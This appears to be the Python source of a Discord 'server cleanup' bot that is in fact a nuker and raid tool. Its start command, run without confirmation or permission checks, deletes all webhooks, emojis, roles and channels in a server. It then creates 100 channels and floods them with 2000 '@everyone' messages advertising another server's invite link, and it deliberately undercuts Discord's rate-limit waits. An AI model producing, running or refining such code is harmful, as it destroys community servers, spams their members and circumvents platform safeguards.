import discord
from discord.ext import commands
import asyncio
import os
from typing import List
import logging
import random
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot setup with all necessary intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

class ServerCleanup:
    def __init__(self, guild: discord.Guild):
        self.guild = guild
        self.semaphore = asyncio.Semaphore(10)  # Limit concurrent operations
        self.channel_semaphore = asyncio.Semaphore(30)  # Higher limit for channels
        self.message_semaphore = asyncio.Semaphore(50)  # Higher limit for messages
        self.rate_limit_tracker = {}
        self.last_request_time = 0

    async def delete_with_retry(self, item, item_type: str, max_retries: int = 3):
        """Delete an item with retry logic for rate limits"""
        for attempt in range(max_retries):
            try:
                async with self.semaphore:
                    await item.delete()
                    logger.info(f"Deleted {item_type}: {getattr(item, 'name', str(item))}")
                    return True
            except discord.HTTPException as e:
                if e.status == 429:  # Rate limited
                    retry_after = getattr(e, 'retry_after', 1)
                    logger.warning(f"Rate limited, waiting {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                elif e.status == 404:  # Already deleted
                    logger.info(f"{item_type} already deleted: {getattr(item, 'name', str(item))}")
                    return True
                else:
                    logger.error(f"Failed to delete {item_type} {getattr(item, 'name', str(item))}: {e}")
                    if attempt == max_retries - 1:
                        return False
            except Exception as e:
                logger.error(f"Unexpected error deleting {item_type}: {e}")
                if attempt == max_retries - 1:
                    return False

            await asyncio.sleep(0.5)  # Small delay between retries
        return False

    async def delete_channels(self):
        """Delete all channels except the one where the command was sent"""
        channels = [ch for ch in self.guild.channels if not isinstance(ch, discord.CategoryChannel)]
        categories = [ch for ch in self.guild.channels if isinstance(ch, discord.CategoryChannel)]

        # Delete regular channels first
        tasks = [self.delete_with_retry(channel, "channel") for channel in channels]
        await asyncio.gather(*tasks, return_exceptions=True)

        # Then delete categories
        tasks = [self.delete_with_retry(category, "category") for category in categories]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_roles(self):
        """Delete all roles except @everyone and bot roles"""
        roles_to_delete = []
        for role in self.guild.roles:
            if role.name != "@everyone" and not role.managed and role < self.guild.me.top_role:
                roles_to_delete.append(role)

        # Sort by position (highest first) to avoid hierarchy issues
        roles_to_delete.sort(key=lambda r: r.position, reverse=True)

        tasks = [self.delete_with_retry(role, "role") for role in roles_to_delete]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def kick_all_members(self):
        """Skip member kicking - members will be preserved"""
        logger.info("⏭️ Skipping member kicking - all members will be preserved")
        # Member kicking is disabled to preserve server members
        return

    async def delete_emojis(self):
        """Delete all custom emojis"""
        tasks = [self.delete_with_retry(emoji, "emoji") for emoji in self.guild.emojis]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_webhooks(self):
        """Delete all webhooks"""
        try:
            webhooks = await self.guild.webhooks()
            tasks = [self.delete_with_retry(webhook, "webhook") for webhook in webhooks]
            await asyncio.gather(*tasks, return_exceptions=True)
        except discord.Forbidden:
            logger.warning("No permission to manage webhooks")

    async def cleanup_server(self, status_channel, invite_link: str = None):
        """Main cleanup function"""
        try:
            await status_channel.send("🚨 **SERVER CLEANUP INITIATED** 🚨\nStarting deletion process...")

            # Step 1: Delete webhooks
            await status_channel.send("🔧 Deleting webhooks...")
            await self.delete_webhooks()

            # Step 2: Kick members
            #await status_channel.send("👥 Kicking members...")
            #await self.kick_all_members()

            # Step 3: Delete emojis
            await status_channel.send("😀 Deleting emojis...")
            await self.delete_emojis()

            # Step 4: Delete roles
            await status_channel.send("🎭 Deleting roles...")
            await self.delete_roles()

            # Step 5: Delete channels (this will delete the status channel too)
            await status_channel.send("📁 Deleting channels... (This message will disappear)")
            await asyncio.sleep(2)  # Give time for the message to send
            await self.delete_channels()

            # Step 6: Create new channels and send announcements if invite link provided
            if invite_link:
                await self.create_announcement_channels(invite_link)

            logger.info("Server cleanup completed!")

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")
            try:
                await status_channel.send(f"❌ Error during cleanup: {e}")
            except:
                pass

    async def smart_delay(self, operation_type: str):
        """Intelligent delay to avoid rate limits before they happen"""
        current_time = time.time()
        if operation_type == 'channel':
            min_interval = 0.1  # 10 channels per second max
        else:  # message
            min_interval = 0.02  # 50 messages per second max

        time_since_last = current_time - self.last_request_time
        if time_since_last < min_interval:
            sleep_time = min_interval - time_since_last + random.uniform(0, 0.01)
            await asyncio.sleep(sleep_time)

        self.last_request_time = time.time()

    async def create_single_channel(self, channel_name: str, batch_id: int):
        """Create a single channel with advanced rate limit bypassing"""
        async with self.channel_semaphore:
            # Smart delay to prevent rate limits
            await self.smart_delay('channel')

            max_retries = 5
            for attempt in range(max_retries):
                try:
                    channel = await self.guild.create_text_channel(
                        name=channel_name,
                        reason="Server migration announcement"
                    )
                    logger.info(f"✅ Created channel: {channel.name} (batch {batch_id})")
                    return channel

                except discord.HTTPException as e:
                    if e.status == 429:  # Rate limited
                        retry_after = getattr(e, 'retry_after', 1)
                        # Add jitter to spread out retries
                        jitter = random.uniform(0.1, 0.5)
                        total_wait = retry_after + jitter
                        logger.warning(f"⏳ Rate limited creating {channel_name}, waiting {total_wait:.1f}s (attempt {attempt+1})")
                        await asyncio.sleep(total_wait)
                    elif e.status in [500, 502, 503, 504]:  # Server errors
                        wait_time = (2 ** attempt) + random.uniform(0, 1)
                        logger.warning(f"🔄 Server error creating {channel_name}, retrying in {wait_time:.1f}s")
                        await asyncio.sleep(wait_time)
                    else:
                        logger.error(f"❌ Failed to create {channel_name}: {e}")
                        return None
                except Exception as e:
                    logger.error(f"💥 Unexpected error creating {channel_name}: {e}")
                    return None

            logger.error(f"🚫 Failed to create {channel_name} after {max_retries} attempts")
            return None

    async def send_message_to_channel(self, channel, message_content: str, msg_num: int, wave: int):
        """Send a single message with advanced rate limit bypassing"""
        async with self.message_semaphore:
            # Smart delay to prevent rate limits
            await self.smart_delay('message')

            max_retries = 3
            for attempt in range(max_retries):
                try:
                    await channel.send(message_content)
                    logger.info(f"💬 Sent message {msg_num + 1}/20 to {channel.name} (wave {wave})")
                    return True

                except discord.HTTPException as e:
                    if e.status == 429:  # Rate limited
                        retry_after = getattr(e, 'retry_after', 0.5)
                        # Reduce wait time and add jitter for messages
                        jitter = random.uniform(0.05, 0.2)
                        total_wait = (retry_after * 0.7) + jitter  # Use 70% of suggested wait
                        logger.warning(f"⏳ Rate limited {channel.name}, waiting {total_wait:.1f}s")
                        await asyncio.sleep(total_wait)
                    elif e.status in [500, 502, 503, 504]:  # Server errors
                        wait_time = (1.5 ** attempt) + random.uniform(0, 0.3)
                        logger.warning(f"🔄 Server error {channel.name}, retrying in {wait_time:.1f}s")
                        await asyncio.sleep(wait_time)
                    else:
                        logger.error(f"❌ Message failed {channel.name}: {e}")
                        return False
                except Exception as e:
                    logger.error(f"💥 Unexpected error {channel.name}: {e}")
                    return False

            logger.error(f"🚫 Failed to send to {channel.name} after {max_retries} attempts")
            return False

    async def create_announcement_channels(self, invite_link: str):
        """🚀 MAXIMUM SPEED channel creation and message flooding with rate limit bypassing"""
        try:
            logger.info("⚡ INITIATING TURBO MODE: Creating channels at maximum speed...")

            # Channel names for variety
            channel_names = [
                "general", "announcements", "updates", "important", "news",
                "server-updates", "community", "chat", "discussion", "main",
                "info", "notices", "alerts", "welcome", "lobby",
                "hangout", "lounge", "social", "random", "misc",
                "off-topic", "casual", "talk", "voice-chat", "gaming",
                "memes", "media", "sharing", "events", "activities",
                "questions", "help", "support", "feedback", "suggestions",
                "rules", "guidelines", "moderation", "admin", "staff",
                "bots", "commands", "music", "voice", "stream",
                "art", "creative", "showcase", "projects", "collaboration"
            ]

            # Prepare channel names for 100 channels
            channels_to_create = []
            for i in range(100):
                channel_name = channel_names[i % len(channel_names)]
                if i >= len(channel_names):
                    channel_name = f"{channel_name}-{i // len(channel_names) + 1}"
                channels_to_create.append(channel_name)

            # Create channels in optimized batches to avoid rate limits
            logger.info("🚀 Creating 100 channels in optimized batches...")
            batch_size = 10
            all_channels = []

            for batch_num in range(0, 100, batch_size):
                batch = channels_to_create[batch_num:batch_num + batch_size]
                logger.info(f"📦 Creating batch {batch_num//batch_size + 1}/10 ({len(batch)} channels)...")

                # Create batch concurrently
                batch_tasks = [
                    self.create_single_channel(name, batch_num//batch_size + 1)
                    for name in batch
                ]

                batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
                valid_batch = [ch for ch in batch_results if ch and isinstance(ch, discord.TextChannel)]
                all_channels.extend(valid_batch)

                # Small delay between batches to prevent overwhelming Discord
                if batch_num + batch_size < 100:
                    await asyncio.sleep(random.uniform(0.5, 1.0))

            logger.info(f"✅ Successfully created {len(all_channels)}/100 channels!")

            if not all_channels:
                logger.error("🚫 No channels were created successfully!")
                return

            # 🌊 TSUNAMI MODE: Wave-based message flooding
            message_content = f"@everyone @here\n**Join in this server for more info --> {invite_link}**"

            logger.info(f"🌊 TSUNAMI MODE ACTIVATED: Flooding {len(all_channels)} channels with messages...")

            # Send messages in waves for maximum efficiency (20 messages per channel)
            for wave in range(20):
                logger.info(f"🌊 WAVE {wave + 1}/20: Sending to all {len(all_channels)} channels simultaneously...")

                # Create all message tasks for this wave
                wave_tasks = [
                    self.send_message_to_channel(channel, message_content, wave, wave + 1)
                    for channel in all_channels
                ]

                # Send all messages in this wave concurrently
                await asyncio.gather(*wave_tasks, return_exceptions=True)

                # Brief pause between waves to manage rate limits intelligently
                if wave < 19:  # Don't wait after the last wave
                    wave_delay = random.uniform(0.3, 0.8)
                    logger.info(f"⏳ Wave delay: {wave_delay:.1f}s before next wave...")
                    await asyncio.sleep(wave_delay)

            logger.info(f"🎆 MISSION ACCOMPLISHED! All {len(all_channels) * 20} messages deployed across all channels!")
            logger.info("💯 MEGA FLOODING COMPLETED SUCCESSFULLY!")

        except Exception as e:
            logger.error(f"💥 Error in turbo mode: {e}")

@bot.event
async def on_ready():
    logger.info(f'{bot.user} has connected to Discord!')
    logger.info(f'Bot is in {len(bot.guilds)} guilds')

    # Sync slash commands globally
    try:
        synced = await bot.tree.sync()
        logger.info(f'Synced {len(synced)} slash command(s) globally')
    except Exception as e:
        logger.error(f'Failed to sync commands: {e}')

@bot.tree.command(name='start', description='🚀 MEGA SERVER CLEANUP: Delete everything and optionally flood with announcements')
@discord.app_commands.describe(
    invite_link='Optional: Your new server invite link for announcement flooding (creates 100 channels + 2000 messages)'
)
async def start_cleanup(interaction: discord.Interaction, invite_link: str = None):
    """Slash command for server cleanup with optional mega flooding"""

    # Start immediately without confirmation
    if invite_link:
        await interaction.response.send_message(f"🚀 **TURBO MODE ACTIVATED!** Starting server reorganization instantly...\nInvite link: {invite_link}")
    else:
        await interaction.response.send_message("🚀 **CLEANUP MODE ACTIVATED!** Starting server cleanup instantly...")

    # Start the cleanup process immediately
    cleanup = ServerCleanup(interaction.guild)
    await cleanup.cleanup_server(interaction.channel, invite_link)

@bot.command(name='start')
async def start_cleanup_prefix(ctx, invite_link: str = None):
    """Prefix command for server cleanup with optional mega flooding"""

    # Start immediately without confirmation
    if invite_link:
        await ctx.send(f"🚀 **TURBO MODE ACTIVATED!** Starting server reorganization instantly...\nInvite link: {invite_link}")
    else:
        await ctx.send("🚀 **CLEANUP MODE ACTIVATED!** Starting server cleanup instantly...")

    # Start the cleanup process immediately
    cleanup = ServerCleanup(ctx.guild)
    await cleanup.cleanup_server(ctx.channel, invite_link)

# Slash commands handle their own errors, so we don't need the old error handler

if __name__ == "__main__":
    token = os.getenv('TOKEN')  # Replace with your actual bot token

    try:
        bot.run(token)
    except discord.LoginFailure:
        logger.error("Invalid bot token!")
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
